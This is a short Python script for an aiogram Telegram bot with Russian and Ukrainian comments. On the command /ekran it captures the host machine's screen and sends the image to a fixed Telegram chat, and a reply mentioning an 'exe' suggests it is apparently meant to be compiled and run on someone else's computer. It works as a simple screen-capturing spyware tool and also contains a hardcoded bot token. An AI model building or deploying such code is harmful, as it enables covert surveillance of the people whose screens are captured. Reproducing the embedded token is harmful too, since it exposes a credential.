from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import pyautogui
import os

# Замените 'TOKEN' на токен вашего бота
TOKEN = '7094826046:AAHHXXvvIoui7knl5M_Lei0k08yKB_DGKIg'

# ID чата, на который должен реагировать бот
CHAT_ID = -1002144476171

# Создаем объект бота
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Обработка команды /test
@dp.message_handler(commands=['test'], chat_id=CHAT_ID)
async def send_welcome(message: types.Message):
    await message.reply("👱‍♂️ Отправление сообщения через exe.")

#CREATE SCREEN
async def send_screenshot(chat_id):
    screenshot = pyautogui.screenshot()  # Знімаємо скріншот
    screenshot_path = "img.png"  # Шлях до збереженого скріншота
    screenshot.save(screenshot_path)  # Зберігаємо скріншот
    with open(screenshot_path, "rb") as photo:
        await bot.send_photo(chat_id, photo)  # Відправляємо скріншот в Телеграм
        os.remove(screenshot_path)



@dp.message_handler(commands=["ekran"], chat_id=CHAT_ID)
async def get_screenshot(message: types.Message):
    chat_id = message.chat.id
    await send_screenshot(chat_id)

# Запускаем бота
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)